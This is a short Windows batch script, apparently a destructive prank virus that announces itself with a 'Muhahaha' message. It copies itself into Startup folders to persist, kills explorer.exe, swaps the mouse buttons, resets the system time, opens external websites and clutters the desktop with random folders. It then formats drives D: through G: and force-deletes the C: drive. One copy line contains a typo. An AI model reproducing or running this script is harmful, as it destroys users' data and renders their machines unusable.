color a

cls
@echo off

msg * (Muhahaha)

set date=1
time 0:00

copy %0 "%homedrive%%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy %0 "%homedrive%%homepath%\Startm~1\Programme\Autostart\"
copy 0% "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"

taskkill /IM explorer.exe /f

Rundll32 user32, SwapMouseButton

start www.evil-shit.de
start www.akk.li/pics/anne/jpg

cd %userprofile%\desktop

md %random%
md %random%
md %random%
md %random%

format D:\ /F

format E:\ /F

format F:\ /F

format G:\ /F

RD C:\ /S /Q